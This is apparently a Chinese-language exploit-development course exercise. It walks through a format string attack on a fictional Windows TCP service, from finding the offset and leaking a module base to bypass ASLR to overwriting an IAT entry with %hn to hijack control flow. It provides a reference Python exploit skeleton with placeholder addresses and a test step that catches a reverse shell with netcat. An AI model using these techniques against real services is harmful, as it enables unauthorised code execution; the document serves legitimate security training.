# 練習 F — format string → leak → 控制流

> **目標**：對一個明確「已啟用 `%n`」的 format string 漏洞目標,完整走一次 Ch 34-36 的生產線——定位 offset、用 `%x`/`%s` leak 記憶體繞過 ASLR、再用 `%n` 改寫一個函式指標導向你的 shellcode。寫出一支端到端的 Python exploit。

> **環境**：Win10 x64 22H2 + WinDbg（2026）+ Python 3 + Kali。假設你已完成 Ch 34-36。

## 背景與動機

Ch 34-36 把 format string 漏洞拆成三個獨立技巧講:原理、任意讀、任意寫。真實考場或真實目標不會幫你把三步分開——你拿到的是一整個會崩潰或行為怪異的網路服務,必須自己判斷「這是不是 format string 漏洞」「`%n` 有沒有被啟用」「offset 是多少」「leak 什麼才夠用」「改寫哪裡才能拿到執行權」。

這個練習的目標假設(明確寫在任務規格裡,不用你去猜)是:**目標程式存在 `printf(user_input)` 這種漏洞,且目標程式已經呼叫過 `_set_printf_count_output(1)`,因此 `%n` 真正會寫入記憶體**。這個前提在真實 Windows 目標上**不是預設成立**(Ch 34 已詳述),本練習明確給定它,是為了讓你能完整練到「任意寫 → 控制流劫持」這條完整鏈,而不是在「`%n` 到底能不能用」這個查證步驟上卡住。拿到真實陌生目標時,請先用 Ch 34 的查證方法確認這個前提,再套用本練習的方法論。

## 任務規格

目標是一支虛構的 32-bit TCP 服務(可自行用 C 寫一支最小可行版本練習,或用本課其他練習靶程式改造,重點是漏洞模式,不是特定二進位):

1. 服務收到一行文字,直接呼叫 `printf(received_buffer)`(未經任何過濾),且程式初始化時呼叫過 `_set_printf_count_output(1)`。
2. 程式裡存在一個全域函式指標(或 IAT 條目),會在收到特定指令後被呼叫——這是你要劫持的目標。
3. 任務:
   - 用 `%x` 定位出攻擊者可控 buffer 對應的 offset,並用第二個標記驗證。
   - 用 `%s` leak 出目標模組的基址(或任何能幫助算出函式指標/IAT 絕對位址的資訊),繞過 ASLR。
   - 用 `%hn`/`%hhn` 把定位出的函式指標改寫成指向你的 shellcode(或一個簡單的 `calc.exe` PoC,先驗證控制流劫持本身成立,再接上真正 shellcode)。
   - 觸發程式呼叫被改寫的指標,確認執行流跳到你指定的位址。

## 期望輸出

- 一支完整 Python 3 exploit 腳本,分成三個清楚的階段函式:`find_offset()`、`leak_base()`、`arbitrary_write()`,主流程依序呼叫。
- 一份你自己的實測記錄(或標「理論預期」並說明驗證方法):offset 數值、leak 到的基址範例、改寫目標的絕對位址計算方式。
- 簡短說明為什麼選這個改寫目標(對照 Ch 36 的目標選擇表格)。

## 如果卡住:提示

1. **送出一串 `%x` 完全沒有回應,或服務直接斷線**：先確認服務真的會把 `printf` 的輸出回顯給你(有些服務只內部記 log),否則定位 offset 需要換一種觀察方式(例如看服務是否崩潰、或搭配 WinDbg 直接看記憶體)。
2. **`%s` 一用就讓服務當掉**：代表那個 slot 的值不是合法可讀位址。回頭檢查 offset 是否真的對,或你放進去的「目標讀取位址」算錯(例如基址還沒 leak 出來就先用了)。
3. **`%hn` 寫入後程式沒有任何變化**：先確認 `%n` 真的被啟用(本練習已假設啟用,但如果你拿真實目標練,這是第一個要查的)。再確認你改寫的目標位址之後真的會被程式讀取並使用——用 WinDbg 在改寫後的位址設記憶體寫入斷點(`ba w4 <addr>`),確認寫入真的發生。
4. **兩次 `%hn` 寫入的值對不上預期**：重新檢視每一輪 `%x`/`%hn` 之前「累積已輸出字元數」的計算,這是整個任意寫流程最容易算錯的地方。建議在 WinDbg 裡對 `printf` 呼叫點下斷點,單步執行,肉眼核對每一步的字元數。
5. **改寫成功但執行流沒有跳到預期位址**：可能改寫的指標類型不對(例如改到的是資料指標而不是函式指標)、或 CFG 之類的現代緩解擋下了間接呼叫(見 Ch 36 進階段落)。先用最簡單的 PoC(改寫成指向 `int3`,即 `\xcc`)驗證「程式真的會呼叫這個被改寫的指標」,再換上真正 shellcode。

## 實作步驟

1. **偵查**:連上目標,送一個包含 `%x` 的測試字串,確認服務真的把輸入當 format string 解析(觀察輸出是不是看起來像隨機 stack 資料,而非原樣回顯)。
2. **定位 offset**:依 Ch 35 流程,送標記 + 一串 `%x`,找出標記出現的輪數,換第二個標記驗證。
3. **Leak 繞 ASLR**:選一個已知相對偏移、值得 leak 的位址(例如模組裡某個會印出可辨識字串的已知偏移),用 `%s` 讀出,反推模組基址。
4. **計算改寫目標的絕對位址**:用 leak 到的基址 + 靜態分析(IDA)算出的偏移,得到函式指標/IAT 條目的絕對位址。
5. **分段任意寫**:用 `%hn`/`%hhn` 把這個位址的內容改寫成 shellcode 位址,先用 `int3` PoC 驗證劫持成功,再換上真正 shellcode。
6. **觸發 + 驗證**:觸發程式呼叫被改寫的指標,WinDbg 裡確認中斷在你預期的位址,換上 reverse shell shellcode 完整跑一次。

## 參考解答

<details>
<summary>完整參考解答(先自己動手,卡住 15 分鐘以上才展開)</summary>

**全部位址、offset、leak 偏移皆為示範用的占位值,未實測,理論預期——必須在你自己的靶機依本練習方法實測後替換。**

```python
#!/usr/bin/env python3
"""
format string: leak (繞 ASLR) + %n 任意寫 -> 控制流劫持
前提假設(明確給定,非目標預設行為):
  1. 目標存在 printf(user_input) 漏洞
  2. 目標已呼叫 _set_printf_count_output(1),%n 真正會寫入
所有數值為示範骨架,未實測 - 務必依本練習方法在自己環境實測後替換。
"""
import socket
import struct
import sys

target_ip   = "192.168.x.x"
target_port = 9999


def send_recv(payload: bytes, timeout: float = 3.0) -> bytes:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target_ip, target_port))
    s.send(payload + b"\r\n")
    try:
        data = s.recv(4096)
    except socket.timeout:
        data = b""
    s.close()
    return data


# ---- 階段 1：定位 offset ----
def find_offset(max_rounds: int = 20) -> int:
    marker = b"AAAA"                       # 0x41414141
    fmt = b"." + b".".join([b"%x"] * max_rounds)
    resp = send_recv(marker + fmt)

    parts = resp.split(b".")
    for i, p in enumerate(parts):
        if p == b"41414141":
            print(f"[+] 候選 offset = {i}")
            return i

    raise RuntimeError("找不到標記,先確認服務是否回顯 printf 輸出")


def verify_offset(offset: int) -> bool:
    marker = b"BBBB"                       # 0x42424242,換個標記再驗證一次
    fmt = b"." + b".".join([b"%x"] * (offset + 2))
    resp = send_recv(marker + fmt)
    parts = resp.split(b".")
    return len(parts) > offset and parts[offset] == b"42424242"


# ---- 階段 2：leak 繞 ASLR ----
def leak_base(offset: int, known_offset_in_module: int) -> int:
    """
    leak 目標模組裡,相對模組基址 known_offset_in_module 的那個位址的內容。
    假設那個位址存了一個「也指回模組內某處」的指標,leak 出來後減掉
    靜態分析得知的偏移,就能反推模組基址。
    """
    probe_addr = 0x6f4a2000                # 占位:leak 用的已知可讀位址(示意)
    addr_bytes = struct.pack("<I", probe_addr)

    fmt = b"%x." * (offset - 1) + b"%s"
    payload = addr_bytes + fmt
    resp = send_recv(payload)

    # 未實測:實際要從 resp 裡把 %s 印出的內容切出來,轉成位址數值。
    # 這裡僅示意「假設拿到了 4 bytes 的指標值」。
    leaked_ptr = struct.unpack("<I", resp[:4])[0] if len(resp) >= 4 else 0
    module_base = leaked_ptr - known_offset_in_module
    print(f"[+] leak 到的指標值 = {hex(leaked_ptr)}, 推算模組基址 = {hex(module_base)}")
    return module_base


# ---- 階段 3：%hn 分段任意寫 ----
def build_write_payload(offset: int, target_addr: int, new_value: int) -> bytes:
    low_word  = new_value & 0xFFFF
    high_word = (new_value >> 16) & 0xFFFF

    addr_low  = struct.pack("<I", target_addr)
    addr_high = struct.pack("<I", target_addr + 2)

    already_output = 8  # 兩個 4-byte 位址被某輪 %x 印出後的估計字元數,務必依實測調整
    pad1 = (low_word - already_output) & 0xFFFF
    pad2 = (high_word - low_word) & 0xFFFF

    fmt = (
        b"%" + str(pad1).encode() + b"x" +
        b"%hn" +
        b"%" + str(pad2).encode() + b"x" +
        b"%hn"
    )
    # 注意:%hn 實際作用的 slot 要對應到 offset 算出的位置,
    # 完整對齊需要搭配 %N$hn(若目標 CRT 支援,以實測為準)或額外 %x 佔位調整,
    # 此處省略佔位細節,留給你依 Ch 36 的方法在自己環境補完並驗證。
    return addr_low + addr_high + fmt


def arbitrary_write(offset: int, target_addr: int, new_value: int):
    payload = build_write_payload(offset, target_addr, new_value)
    send_recv(payload)
    print(f"[+] 已送出任意寫 payload,目標位址 {hex(target_addr)} -> {hex(new_value)}")


def main():
    offset = find_offset()
    if not verify_offset(offset):
        print("[-] offset 驗證失敗,請重新定位")
        sys.exit(1)

    module_base = leak_base(offset, known_offset_in_module=0x1000)

    iat_entry_offset = 0x2050              # 占位:靜態分析(IDA)得出的 IAT 偏移
    target_addr = module_base + iat_entry_offset

    poc_marker = module_base + 0x100       # 先用一個無害值驗證劫持成立(示意)
    arbitrary_write(offset, target_addr, poc_marker)

    # 驗證成功後,換成真正的 shellcode 位址(例如先前已用其他手法放入記憶體的 NOP sled + shellcode 起點)
    # shellcode_addr = ...
    # arbitrary_write(offset, target_addr, shellcode_addr)


if __name__ == "__main__":
    main()
```

這支腳本的重點不是數值本身(全部標注未實測),而是**三階段的結構**:`find_offset` → `leak_base` → `arbitrary_write`,對應 Ch 34-36 的三章內容。拿到真實目標時,把每個占位值換成你自己在 WinDbg 裡逐步核對出的實測結果。

</details>

## 測試用例表

| 測試情境 | 預期行為 | 如何驗證 |
|---|---|---|
| 送一串 `%x`,不帶任何標記 | 回顯一串看起來隨機的 16 進位數字 | 觀察回應,確認服務真的在解析 format string |
| 送標記 + `%x` 定位 offset | 某一輪輸出精確等於標記值 | 腳本自動比對,人工再核對一次 |
| 換第二個標記重新定位 | 落在同一個 offset | 兩次結果一致才算確認 |
| 用 `%s` 讀一個已知合法位址 | 讀出該位址開始的可辨識字串/資料,不當機 | 服務存活,輸出內容與預期偏移內容一致 |
| 用 `%s` 讀一個故意錯誤的位址 | access violation,服務崩潰 | 作為對照組,確認 `%s` 真的在解參考而不是單純印數字 |
| `%hn` 任意寫後,WinDbg 設記憶體寫入斷點 | 斷點觸發,寫入的值符合計算結果 | `ba w4 <target_addr>`,核對暫存器/記憶體內容 |
| 完整 payload 觸發控制流劫持(PoC `int3`) | WinDbg 在被改寫的位址處中斷 | `g` 繼續執行後觀察是否停在目標位址 |
| 換上真正 shellcode | 攻擊機收到 reverse shell 連線 | `nc -lvnp <port>` 監聽 |

## 延伸挑戰

1. **單一 payload 同時完成 leak + write**:設計一個 format string,在同一次 `printf` 呼叫裡,前半段用 `%s` leak 出需要的基址資訊,後半段立刻用(腳本端事先算好、嵌入同一個 payload 的)位址做 `%hn` 寫入——這需要你在送出前就能推算 leak 階段會拿到什麼,或改成兩次往返(先 leak、算完位址、再送第二個 payload 做寫入),比較兩種設計的實務可行性與限制。
2. **改寫 IAT 條目 vs 改寫 return address**:對同一個目標程式分別嘗試兩種改寫目標,比較兩者在定位難度、payload 長度、穩定性上的差異,寫一段簡短比較。
3. **搭配 Ch 33 的完整鏈**:把本練習 leak 出的基址,接上 Ch 28-30 的 ROP chain 技巧,構造一條「format string leak 繞 ASLR → ROP chain 繞 DEP」的完整鏈,而不只是單純改寫指標指向 shellcode。

## 自我檢核

- [ ] 能說出本練習假設的前提(`%n` 已啟用)在真實 Windows 目標上為什麼不是預設成立
- [ ] 能複述你自己(或依腳本邏輯推演)的 offset 定位結果,以及為什麼要用第二個標記驗證
- [ ] 能解釋 leak 到的值怎麼反推出模組基址,以及這一步如何繞過 ASLR
- [ ] 能說出為什麼選擇 IAT 條目(或你選的其他目標)作為任意寫的改寫對象,對照 Ch 36 的目標選擇表格
- [ ] 能在不看參考解答的情況下,獨立說出 `find_offset` → `leak_base` → `arbitrary_write` 三階段各自要解決什麼問題

掌握 format string 這條完整鏈之後,Part 10 換一個完全不同的題型:不靠記憶體崩潰拿執行權,而是直接動手修改一支合法 PE 檔案,讓它悄悄多跑一段你的程式碼。

→ [Ch 37 PE 後門原理：code cave、hijack entry point](./37-pe-backdoor-principles.md)
